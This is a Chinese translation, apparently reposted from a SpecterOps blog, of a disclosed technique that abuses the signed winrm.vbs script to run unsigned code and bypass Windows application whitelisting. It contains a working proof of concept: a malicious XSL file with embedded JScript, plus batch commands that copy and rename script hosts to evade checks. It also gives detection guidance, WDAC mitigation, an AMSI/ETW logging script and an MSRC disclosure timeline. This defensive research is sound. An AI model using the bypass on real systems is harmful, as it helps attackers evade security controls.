## 绕过方法描述  

**winrm.vbs（一个位于system32目录下的具有Windows签名的脚本文件）可以被用来调用用户定义的XSL文件，从而导致任意的、没有签名的代码执行。当用户向winrm.vbs提供'-format:pretty'或者'-format:text'参数时，winrm.vbs将从cscript.exe所在目录读取WsmPty.xsl或Wsmtxt.xsl文件。这意味着若将cscript.exe拷贝到攻击者可以控制的目录下，并将恶意的XSL文件也置于相同路径中，攻击者将可以绕过签名保护而执行任意代码。这个攻击手段和Casey
Smith的wmic.exe技术很相像。**

## 绕过方法的POC

整个工作流程如下所示：

1.在攻击者可以控制的目录中放置恶意的WsmPty.xsl或者WsmTxt.xsl文件。

2.拷贝cscript.exe或者wscript.exe到相同的目录中。

3.根据第一步中的恶意XSL文件(WsmPty.xsl或者WsmTxt.xsl)，执行winrm.vbs并提供不同的参数('-format:pretty'或者'-format:text')。下面是一个恶意XSL文件的例子。该文件可以被放置到上述第一步中的路径中（对于这个例子来说，是C:\BypassDir\WsmPty.xsl）:

    
    
    <?xml version='1.0'?>
    <stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
     <ms:script implements-prefix="user" language="JScript">
     <![CDATA[
     var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
     ]]> </ms:script>
    </stylesheet>
    

一个更加有攻击意义的XSL文件可以执行通过[DotNetToJScript](https://github.com/tyranid/DotNetToJScript)生成的Payload，导致攻击者可以利用该手法执行任意不具有签名的代码。在放置了恶意XSL文件后，以下的批处理文件可以被用来启动paylaod：

    
    
    mkdir %SystemDrive%\BypassDir
    copy %windir%\System32\cscript.exe %SystemDrive%\BypassDir
    %SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
    

## 我是如何发现该问题的

我发现这个问题完全是出于偶然。我曾和Casey一起研究利用wmic.exe的XSL绕过方法，不久之后，我又开始检查系统自带的各种VBS和JScript文件，寻找更多的绕过方法。我之所以开始检查这些自带的脚本是因为Matt
Nelson的.vbs注入技术给了我启发。当我在查阅winrm.vbs源码的时候，文件中的'WsmPty'以及'WsmTxt'马上引起了我的注意，因为Casey曾经在他的博客中说过，对于使用了XSL的文件，它们可以通过在XSL文件中嵌入WSH脚本内容而拥有执行任意代码的潜力。毫无疑问，winrm.vbs也不例外。我非常注重于寻找这些具备Windows签名的，并可以导致任意代码执行的脚本或者二进制文件。这是因为它们不仅可以绕过应用白名单的防御，同时它们也不容易被安全软件检查出来（至少当它们还没有被公布的时候）。我会一直都在寻找它们的路上！

## 检测策略

若要对上述的方法做出有效的检测和防护，寻找这类攻击手段所需要的最小组件集合是很重要的。

> 攻击者控制的WsmPty.xsl或者WsmTxt.xsl文件一定会被创建

winrm.vbs硬编码了这两个文件的名字，并明确将这两个文件同'pretty'或者'text'参数绑定到了一起。目前来看，这两个文件只可能当前工作目录中被获取（多数情况下就是cscript.exe所在的目录），而不太可能被重定向到其他位置。从防守的角度上来说，若一个WsmPty.xsl或WsmTxt.xsl文件与它们在System32目录下的版本具有不同哈希值，则我们可以认为这个XSL文件是可疑的。幸运的是，合法的XSL文件很少会有变化。

> 一个具有有效签名的winrm.vbs会被执行。若要利用本文的绕过方法，攻击者不能修改winrm.vbs的内容

通过在命令行中寻找'winrm.vbs'字符串这种防御手段是不足的，因为攻击者可以任意修改winrm.vbs的文件名。

> 调用winrm.vbs时的'format'参数必须指定为'pretty'或'text'，这样winrm.vbs才会调用对应xsl文件

攻击者不仅仅可以采用'format'参数，下面的变种形式也是可以的(大小写敏感)：

> -format:pretty
>
> -format:"pretty"
>
> /format:pretty
>
> /format:"pretty"
>
> -format:text
>
> -format:"text"
>
> /format:text
>
> /format:"text"

若仅仅查找'format'字符串可以检测到上述的所有变体，这种方法带来的误报会很多。'format:'后面所接内容的合法与否将取决于具体的公司环境。不过，对xsl文件的合法引用更多的来源于system32目录下的csript.exe和winrm.vbs文件，而不会来源于其他位置。

> winrm.vbs应该是被cscript.exe执行的。winrm.vbs内部的逻辑验证了这一点。

winrm.vbs通过验证WScript.FullName是否包含了字符串'cscript.exe'这一点来验证其自身是被cscript.exe执行的。这个验证本身是不够完善的，因为它仅仅检查可执行文件的路径中是否包含'cscript.exe'字符串。这将导致攻击者可以从一个被重命名过的cscript.exe启动winrm.vbs，甚至可以用其他的脚本解释器(例如wscript.exe)来启动winrm.vbs。下面的批处理程序的例子解释了如何绕过winrm.vbs脚本中对'cscript.exe'的验证：

    
    
    mkdir %SystemDrive%\BypassDir\cscript.exe
    copy %windir%\System32\wscript.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe
    %SystemDrive%\BypassDir\cscript.exe\winword.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
    

## 检测方法的健壮性

POC例子中的get
wmicimv2/Win32_Process?Handle=4仅仅是为了说明实际的命令行参数将返回一些有意义的东西。这并不意味着这个方法需要WinRM服务被启用。有很多的选项都可以支持'format'参数。

足够健壮的检测手段不应该从命令行中检测'cscript.exe'或者'wscript.exe'作为判断依据。尽管如果攻击者没有刻意规避检测，这种检测方法可以检测到上文所述的攻击手段，但是攻击者若是将script.exe拷贝并重命名，检测手段就对此无能为力了。一个更加健壮的检测方法应该考虑检测二进制文件的签名以及它的'原始文件名'。'原始文件名'这一属性被嵌入到了二进制文件之中，并被签名所保护，而如果攻击者想要修改这一属性，二进制文件的签名将会失效。

## 缓解和阻止措施

本文提到的绕过方法可以通过启用Windows Defender Application Control(WDAC)的User Mode Code
Integrity(UMCI)选项来阻止。由于目前并没有其他有效的方法阻止这些具有Windows签名的脚本文件运行，具有威胁的脚本文件将通过其哈希值被禁用。不过获取各个版本的脚本文件的哈希值会是很困难的，考虑到Windows如此庞大的版本数量。[这篇博客](https://posts.specterops.io/assessing-the-effectiveness-of-hash-based-application-whitelisting-blacklist-rules-fe1cb01975a9)详细说明了为什么通过哈希值禁用文件是不高效的。至于缓解措施，微软可以修改这个脚本文件的内容并重新进行签名。如果这样做的话，这将导致之前版本的脚本文件的签名失效。所以如果我们通过WDAC启用了脚本执行的签名保护，这些脚本的执行将失败。然而，这样的场景只能阻止一个非管理员账户进行攻击，因为攻击者可以通过管理员权限安装微软之前版本的catalog签名，从而恢复脚本文件的签名信息。上述的阻止和缓解措施都依赖于WDAC的开启。考虑到目前有大量企业并没有开启WDAC，就算winrm.vbs被微软修复，也没有什么措施可以阻止攻击将旧版本的winrm.vbs文件放在系统中并加以利用。因此，就算微软修复了winrm.vbs的问题，目前也没有真正足够健壮的方法可以防护此问题。

## WSH/XSL脚本检测

这不是第一次WSH/XSL被攻击者滥用，也不会是最后一次。攻击者应该需要了解它们的payload到底是从磁盘中的文件被执行或者是完全在内存中被执行。通过[ScriptLogging](https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/)技术,Powershell完全具有这种能力。然而对于WSH来说，它们却不具备类似的能力。然而，只要你对于ETW熟悉，利用[Antimalware
Scan
Interface](https://cloudblogs.microsoft.com/microsoftsecure/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/)(AMSI)捕获WSH的内容是完全可能的。AMSI通过`Microsoft-Antimalware-Scan-Interface`
ETW
Provider被暴露出来。如果你想尝试获取ASMI事件，[KrabsETW](https://github.com/Microsoft/krabsetw)是你可以采用的最好的库之一。不过，若仅仅出于实验目的，你可以通过logman.exe获取ETL记录。下面的例子可以开始和暂停ETL的记录，并将ASMI相关的事件记录到ASMITrace.etl:

    
    
    logman start AMSITrace -p Microsoft-Antimalware-Scan-Interface Event1 -o AMSITrace.etl -ets
    <After starting the trace, this is when you'd run your malicious code to capture its context.>
    logman stop AMSITrace -ets
    

尽管本文章将不会讨论ETW技术，你可能还是想知道我是怎么知道'Microsoft-Antimalware-Scan-Interface'这一EWT
Provider，并且上文中的'Event1'又是从何而来。我是通过`logman query
providers`这一命令查找已注册providers的名称的。'Event1'这一关键字对应着捕获ASMI信息。为了找到这个关键字，我通过[perfview.exe](https://twitter.com/mattifestation/status/774321379411955712)将ETW清单文件导出到XML。这个清单文件可以让你很清楚地了解到通过这一provider到底可以查询到哪些事件。

    
    
    <instrumentationManifest xmlns="http://schemas.microsoft.com/win/2004/08/events">
     <instrumentation xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:win="http://manifests.microsoft.com/win/2004/08/windows/events">
      <events>
       <provider name="Microsoft-Antimalware-Scan-Interface" guid="{2a576b87-09a7-520e-c21a-4942f0271d67}" resourceFileName="Microsoft-Antimalware-Scan-Interface" messageFileName="Microsoft-Antimalware-Scan-Interface" symbol="MicrosoftAntimalwareScanInterface" source="Xml" >
        <keywords>
         <keyword name="Event1" message="$(string.keyword_Event1)" mask="0x1"/>
        </keywords>
        <tasks>
         <task name="task_0" message="$(string.task_task_0)" value="0"/>
        </tasks>
        <events>
         <event value="1101" symbol="task_0" version="0" task="task_0" level="win:Informational" keywords="Event1" template="task_0Args"/>
        </events>
        <templates>
         <template tid="task_0Args">
          <data name="session" inType="win:Pointer"/>
          <data name="scanStatus" inType="win:UInt8"/>
          <data name="scanResult" inType="win:UInt32"/>
          <data name="appname" inType="win:UnicodeString"/>
          <data name="contentname" inType="win:UnicodeString"/>
          <data name="contentsize" inType="win:UInt32"/>
          <data name="originalsize" inType="win:UInt32"/>
          <data name="content" inType="win:Binary" length="contentsize"/>
          <data name="hash" inType="win:Binary"/>
          <data name="contentFiltered" inType="win:Boolean"/>
         </template>
        </templates>
       </provider>
      </events>
     </instrumentation>
     <localization>
      <resources culture="en-US">
       <stringTable>
        <string id="keyword_Event1" value="Event1"/>
        <string id="task_task_0" value="task_0"/>
       </stringTable>
      </resources>
     </localization>
    </instrumentationManifest>
    

在捕获到ETL记录后，你就可以自己任意选择工具来进行分析。Get-WinEvent这一powershell命令就可以很好的解析ETL记录。我写了一个简单的脚本来解析ASMI事件。需要注意的是，WSH无法提供'contentname'这一属性，导致我们不得不手动解析这一事件信息。这个脚本也会捕获到powershell的内容。

    
    
    # Script author: Matt Graeber (@mattifestation)
    # logman start AMSITrace -p Microsoft-Antimalware-Scan-Interface Event1 -o AMSITrace.etl -ets
    # Do your malicious things here that would be logged by AMSI
    # logman stop AMSITrace -ets
    
    $OSArchProperty = Get-CimInstance -ClassName Win32_OperatingSystem -Property OSArchitecture
    $OSArch = $OSArchProperty.OSArchitecture
    
    $OSPointerSize = 32
    if ($OSArch -eq '64-bit') { $OSPointerSize = 64 }
    
    $AMSIScanEvents = Get-WinEvent -Path .\AMSITrace.etl -Oldest -FilterXPath '*[System[EventID=1101]]' | ForEach-Object {
        if (-not $_.Properties) {
            # The AMSI provider is not supplying the contentname property when WSH content is logged resulting
            # in Get-WinEvent or Event Viewer being unable to parse the data based on the schema.
            # If this bug were not present, retrieving WSH content would be trivial.
    
            $PayloadString = ([Xml] $_.ToXml()).Event.ProcessingErrorData.EventPayload
            [Byte[]] $PayloadBytes = ($PayloadString -split '([0-9A-F]{2})' | Where-Object {$_} | ForEach-Object {[Byte] "0x$_"})
    
            $MemoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList @(,$PayloadBytes)
            $BinaryReader = New-Object -TypeName IO.BinaryReader -ArgumentList $MemoryStream, ([Text.Encoding]::Unicode)
    
            switch ($OSPointerSize) {
                32 { $Session = $BinaryReader.ReadUInt32() }
                64 { $Session = $BinaryReader.ReadUInt64() }
            }
    
            $ScanStatus = $BinaryReader.ReadByte()
            $ScanResult = $BinaryReader.ReadInt32()
    
            $StringBuilder = New-Object -TypeName Text.StringBuilder
            do { $CharVal = $BinaryReader.ReadInt16(); $null = $StringBuilder.Append([Char] $CharVal) } while ($CharVal -ne 0)
            $AppName = $StringBuilder.ToString()
            $null = $StringBuilder.Clear()
    
            $ContentSize = $BinaryReader.ReadInt32()
            $OriginalSize = $BinaryReader.ReadInt32()
            $ContentRaw = $BinaryReader.ReadBytes($ContentSize)
            $Content = [Text.Encoding]::Unicode.GetString($ContentRaw)
            $Hash = [BitConverter]::ToString($BinaryReader.ReadBytes(0x20)).Replace('-', '')
            [Bool] $ContentFiltered = $BinaryReader.ReadInt32()
    
            $BinaryReader.Close()
    
            [PSCustomObject] @{
                Session = $Session
                ScanStatus = $ScanStatus
                ScanResult = $ScanResult
                AppName = $AppName
                ContentName = $null
                Content = $Content
                Hash = $Hash
                ContentFiltered = $ContentFiltered
            }
        } else {
            $Session = $_.Properties[0].Value
            $ScanStatus = $_.Properties[1].Value
            $ScanResult = $_.Properties[2].Value
            $AppName = $_.Properties[3].Value
            $ContentName = $_.Properties[4].Value
            $Content = [Text.Encoding]::Unicode.GetString($_.Properties[7].Value)
            $Hash = [BitConverter]::ToString($_.Properties[8].Value).Replace('-', '')
            $ContentFiltered = $_.Properties[9].Value
    
            [PSCustomObject] @{
                Session = $Session
                ScanStatus = $ScanStatus
                ScanResult = $ScanResult
                AppName = $AppName
                ContentName = $ContentName
                Content = $Content
                Hash = $Hash
                ContentFiltered = $ContentFiltered
            }
        }
    }
    
    $AMSIScanEvents
    

在成功捕获之后，你就可以看到这次执行payload的内容了。pic
here利用ETW进行相关检测并不是这篇文章的主题，不过希望这篇文章能够让你产生足够的兴趣，让你之后进行深入研究。

## 披露时间线

为了避免我们披露此问题后，攻击者利用该漏洞造成不良影响，我们一般会先向厂商报告漏洞并提供足够多的时间让它们修复问题。由于本文的漏洞涉及到Windows
Defender Application Control，我们将这个问题提供给了Windows。整个时间线如下所示。

> April 24, 2018 — 向MSRC报告此问题
>
> April 24, 2018 — MSRC知晓了问题并提供了一个事件编号
>
> April 30, 2018 — 收到邮件，告诉我们该问题已被复现
>
> May 24, 2018 — 向MSRC发送邮件，要求更新
>
> May 28, 2018 — 回复称评估过程仍在继续
>
> June 10, 2018 — 向MSRC发送邮件，要求更新
>
> June 11, 2018 — MSRC回复称计划在8月更新中修复问题
>
> July 12, 2018 — MSRC回复称该问题不能通过安全更新方式解决，可能会在下一个版本更新中修复此问题。

原文地址： <https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404>  

***本文作者：无。，转载请注明来自FreeBuf.COM**

